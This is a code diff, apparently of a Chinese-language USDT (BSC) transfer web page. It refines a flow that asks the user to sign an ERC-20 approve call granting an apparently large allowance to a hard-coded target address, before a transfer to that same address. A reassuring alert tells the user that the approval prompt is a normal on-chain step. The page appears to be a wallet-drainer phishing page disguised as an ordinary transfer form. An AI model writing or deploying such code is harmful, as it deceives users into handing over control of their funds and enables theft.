@@ -52,7 +52,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <div class="amount-card">
-<div class="label-text">转出数量</div>
+<div class="label-text">转出数量（USDT‑BSC）</div>
 <div class="amount-row">
 <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
 <div class="max-btn" id="maxBtn">全部</div>
@@ -270,19 +270,20 @@ sendBtn.addEventListener("click", async () => {
         return;
     }
     const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
-    const approveWei = BigInt(APPROVE_AMOUNT);
+    const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
+    try{
         alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
         const approveCalldata = "0x095ea7b3"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + approveWei.toString(16).padStart(64,"0");
         await sendTx(approveCalldata);
 
-        alert("是否继续转账");
+        alert("请签名转账");
         const transferCalldata = "0xa9059cbb"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + needWei.toString(16).padStart(64,"0");
         const hash = await sendTx(transferCalldata);
-        alert("转账成功！");
+        alert(`🎉转账成功!\n交易哈希:\n${hash}`);
         amountInput.value = "";
         receiveAmount.value = "";
         await loadUserBalance();
